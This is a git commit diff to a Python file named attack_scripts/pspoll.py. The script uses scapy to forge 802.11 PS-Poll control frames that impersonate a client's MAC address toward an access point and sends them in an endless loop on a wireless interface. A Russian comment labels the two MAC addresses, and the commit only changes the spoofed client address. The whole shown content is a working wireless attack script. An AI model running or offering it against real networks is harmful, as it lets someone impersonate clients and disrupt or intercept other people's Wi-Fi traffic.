cdb5866d28146d83fc4e59e06c17934e07c5d007
EtoKekyes <kirill040402@yandex.ru>
2024-05-19 22:03:55 +0200

    final

--- attack_scripts/pspoll.py
+++ attack_scripts/pspoll.py
@@ -3,7 +3,7 @@ from scapy.all import *
 frame = RadioTap() /Dot11FCS(type=1,
                              subtype=10, 
                              addr1='50:ff:20:6a:e5:a8', 
-                             addr2='28:c2:1f:33:ba:95')
+                             addr2='c4:3a:be:71:22:7b')
 sendp(frame, iface='wlan1', inter=0.050, loop=1)
 
 #Здесь addr1 – MAC-адрес точки доступа, addr2 – MAC-адрес клиента.
